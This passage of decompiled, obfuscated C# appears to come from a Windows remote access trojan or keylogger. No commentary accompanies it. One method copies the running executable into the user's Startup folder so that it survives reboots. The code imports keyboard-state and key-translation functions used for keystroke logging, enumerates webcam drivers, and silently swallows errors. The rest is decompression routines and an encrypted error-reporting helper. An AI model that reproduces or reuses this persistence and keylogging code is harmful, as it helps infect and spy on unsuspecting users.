				class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2]
			{
				class0_0.string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "SetValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Conversions.ToString(NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + class0_0.string_5 + ".exe", overwrite: true);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}

	static bool smethod_182(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_3;
	}

	static bool smethod_183(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_1;
	}

	static void smethod_184(Class12 class12_0)
	{
		class12_0.type_0.GetMethod("Clear")!.Invoke(class12_0.object_0, new object[0]);
	}

	unsafe static int smethod_185(Class13.Class20 class20_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (int_0 >= 4)
		{
			*(int*)ptr += 2;
			int_0 >>= 1;
		}
		*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		return *(int*)((byte*)ptr + 4);
	}

	static bool smethod_186(Class13.Class19 class19_0)
	{
		if (class19_0.int_0 == 30)
		{
			return Class24.smethod_83(class19_0.class23_0);
		}
		return false;
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_1);

	[DllImport("user32.dll")]
	static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_0, uint uint_2, IntPtr intptr_0);

	static void smethod_187(IWebProxy iwebProxy_0, Class27 class27_0)
	{
		class27_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_188(Class13.Class23 class23_0, int int_0, int int_1)
	{
		class23_0.uint_0 |= (uint)(int_0 << class23_0.int_2);
		class23_0.int_2 += int_1;
		if (class23_0.int_2 >= 16)
		{
			class23_0.byte_0[class23_0.int_1++] = (byte)class23_0.uint_0;
			class23_0.byte_0[class23_0.int_1++] = (byte)(class23_0.uint_0 >> 8);
			class23_0.uint_0 >>= 16;
			class23_0.int_2 -= 16;
		}
	}

	unsafe static int smethod_189(Class13.Class15 class15_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class15_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class15_0.uint_0;
			class15_0.uint_0 >>= 8;
			class15_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			*(int*)((byte*)ptr + 8) = *(int*)ptr;
		}
		else
		{
			*(int*)((byte*)ptr + 4) = class15_0.int_1 - class15_0.int_0;
			if (int_1 > *(int*)((byte*)ptr + 4))
			{
				int_1 = *(int*)((byte*)ptr + 4);
			}
			Array.Copy(class15_0.byte_0, class15_0.int_0, byte_0, int_0, int_1);
			class15_0.int_0 += int_1;
			if (((uint)(class15_0.int_0 - class15_0.int_1) & (true ? 1u : 0u)) != 0)
			{
				class15_0.uint_0 = class15_0.byte_0[class15_0.int_0++] & 0xFFu;
				class15_0.int_2 = 8;
			}
			*(int*)((byte*)ptr + 8) = *(int*)ptr + int_1;
		}
		return *(int*)((byte*)ptr + 8);
	}

	[DllImport("user32.dll")]
	static extern bool GetKeyboardState(byte[] byte_0);

	static int smethod_190(Font font_0, string string_0, Graphics graphics_0, int int_0)
	{
		try
		{
			return Class24.smethod_57(font_0, graphics_0, int_0, string_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class24.smethod_7(int_0, string_0, graphics_0, font_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static Class36 smethod_191()
	{
		if (Class36.class36_0 == null)
		{
			Type[] types = Assembly.GetExecutingAssembly().GetTypes();
			foreach (Type type in types)
			{
				if ((object)type == null || (object)type.BaseType == null || (object)type.BaseType != typeof(Class36))
				{
					continue;
				}
				try
				{
					Class36.class36_0 = (Class36)Activator.CreateInstance(type, nonPublic: true);
					if (Class36.class36_0 != null)
					{
						break;
					}
				}
				catch
				{
				}
			}
		}
		return Class36.class36_0;
	}

	static void smethod_192(bool bool_0, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static bool smethod_193(Class27.Class31 class31_0, byte[] byte_0, Class27 class27_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class24.smethod_121(byte_0);
		}
		catch (Exception)
		{
			Class24.smethod_142(class27_0, Enum0.const_0, Class13.string_0);
			return false;
		}
		byte[] array = Class24.smethod_200(byte_, "<RSAKeyValue><Modulus>tJTaPkUuXySN2HBS3kjfZimXWx3CsJ531R/oEkkDIJwzesSbVV2BI6MJhgONwRwX8Up6057KqMJzZ1ckslRXWv8Li1bBgmKhKxS5zW83gVP06MHAdfKvDC81miy2DU+6TqYLf29vtVHXyS3jllS1MtRI7woNKpdGciea7xXnERk=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class24.smethod_142(class27_0, Enum0.const_0, Class26.string_0);
			return false;
		}
		Class24.smethod_86(class27_0, Enum0.const_1);
		Class38 @class = new Class38("b77c2ed4-b1d8-4739-d071-09c35c6be5d1");
		if (class27_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class27_0.iwebProxy_0;
		}
		Class27.Class29 class2 = new Class27.Class29(class27_0, array, @class, class31_0);
		Class24.smethod_136((Delegate3)class2.method_0, @class);
		return class2.bool_0;
	}

	static void smethod_194(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	unsafe static void smethod_195(Class13.Class17 class17_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			*(int*)((byte*)ptr + 4) = byte_0[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class17_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class17_0.short_0[Class24.smethod_99(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 52) = byte_0[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class24.smethod_99(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class17_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class17_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class17_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_196(Class36 class36_0)
	{
		if (class36_0 != null)
		{
			Class36.class36_0 = class36_0;
			AppDomain.CurrentDomain.UnhandledException += class36_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class36_0.method_0);
		}
	}

	static void smethod_197(Class13.Class16 class16_0, int int_0, int int_1)
	{
		if ((class16_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class16_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class16_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class16_0.byte_0, num, class16_0.byte_0, class16_0.int_0, int_0);
				class16_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class16_0.byte_0[class16_0.int_0++] = class16_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class24.smethod_204(class16_0, num, int_0, int_1);
		}
	}

	[DllImport("shell32")]
	static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static byte[] smethod_198(ref string string_0, Class0 class0_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	static Exception smethod_199(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.exception_0;
	}

	static byte[] smethod_200(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class26.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class26.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class26.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static void smethod_201(bool bool_0, EventArgs2 eventArgs2_0)
	{
		eventArgs2_0.bool_0 = bool_0;
	}

	static void smethod_202(Exception exception_0, object object_0)
	{
		Class24.smethod_144(exception_0, new object[1] { object_0 });
	}

	static string smethod_203(Class0 class0_0)
	{
		string result;
		try
		{
			result = ((FileInfo)class0_0.object_0).LastWriteTime.ToString(new string(new char[10] { 'y', 'y', 'y', 'y', '-', 'M', 'M', '-', 'd', 'd' }));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = new string(new char[7] { 'u', 'n', 'k', 'n', 'o', 'w', 'n' });
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_204(Class13.Class16 class16_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class16_0.byte_0[class16_0.int_0++] = class16_0.byte_0[int_0++];
			class16_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}
}
